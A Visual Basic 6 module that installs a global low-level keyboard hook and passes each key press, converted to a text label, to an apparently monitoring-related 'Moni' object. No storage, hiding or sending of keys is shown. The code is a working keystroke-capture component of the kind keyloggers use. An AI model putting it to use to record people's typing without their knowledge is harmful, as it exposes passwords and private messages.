Attribute VB_Name = "KeyboardHook"
Dim hHook As Long
Private Type PKBDLLHOOKSTRUCT
    vkCode As Long
    scanCode As Long
    flags As Long
    time As Long
    dwExtraInfo As Long
End Type
 
Sub StartKeyboard()
    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, AddressOf HookProc, App.hInstance, 0)
End Sub

Public Function HookProc(ByVal nCode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    On Error GoTo sth
    
    If nCode = HC_ACTION And wParam = WM_KEYDOWN Then
        Dim p As PKBDLLHOOKSTRUCT
        Call CopyMemory(p, ByVal lParam, Len(p))
        Moni.CarryKeyBoard CodeToString(p.vkCode)
    End If

sth:
    HookProc = CallNextHookEx(hHook, nCode, wParam, lParam)

End Function

Sub EndKeyboard()
    Call UnhookWindowsHookEx(hHook)
End Sub
Private Function CodeToString(nCode As Long) As String
   Dim StrKey As String
   
     Select Case nCode
          Case VK_BACK:     StrKey = "BackSpace"
          Case VK_TAB:      StrKey = "Tab"
          Case VK_CLEAR:    StrKey = "Clear"
          Case VK_RETURN:   StrKey = "Enter"
          Case VK_LSHIFT:    StrKey = "LShift"
          Case VK_RSHIFT:    StrKey = "RShift"
          Case VK_LWIN:    StrKey = "LWin"
          Case VK_RWIN:    StrKey = "RWin"
          Case VK_RCONTROL:  StrKey = "RCtrl"
          Case VK_LCONTROL:  StrKey = "LCtrl"
          Case VK_LMENU:     StrKey = "LAlt"
          Case VK_RMENU:     StrKey = "RAlt"
          Case VK_PAUSE:    StrKey = "Pause"
          Case VK_CAPITAL:  StrKey = "CapsLock"
          Case VK_ESCAPE:   StrKey = "ESC"
          Case VK_SPACE:    StrKey = "Space"
          Case vk_PageUp:   StrKey = "Page Up"
          Case vk_PageDown: StrKey = "Page Down"
          Case VK_END:      StrKey = "End"
          Case VK_HOME:     StrKey = "Home"
          Case VK_LEFT:     StrKey = "Left"
          Case VK_UP:       StrKey = "Up"
          Case VK_RIGHT:    StrKey = "Right"
          Case VK_DOWN:     StrKey = "Down"
          Case VK_SELECT:   StrKey = "Select"
          Case VK_PRINT:    StrKey = "Print Screen"
          Case VK_EXECUTE:  StrKey = "Execute"
          Case VK_SNAPSHOT: StrKey = "Snapshot"
          Case VK_INSERT:   StrKey = "Ins"
          Case VK_DELETE:   StrKey = "Del"
          Case VK_HELP:     StrKey = "Help"
          Case VK_NUMLOCK:  StrKey = "Num Lock"
          Case VK_0 To VK_9: StrKey = Chr$(nCode)
          Case VK_A To VK_Z: StrKey = LCase(Chr$(nCode))
          Case VK_F1 To VK_F16: StrKey = "F" & CStr(nCode - 111)
          Case VK_NUMPAD0 To VK_NUMPAD9: StrKey = "Numpad " & CStr(nCode - 96)
          Case VK_MULTIPLY: StrKey = "Numpad {*}"
          Case VK_ADD: StrKey = "Numpad {+}"
          Case VK_SEPARATOR: StrKey = "Numpad {ENTER}"
          Case VK_SUBTRACT: StrKey = "Numpad {-}"
          Case VK_DECIMAL: StrKey = "Numpad {.}"
          Case VK_DIVIDE: StrKey = "Numpad {/}"
          Case Else
               StrKey = Chr(nCode)
     End Select
   CodeToString = "[" & StrKey & "]"
End Function
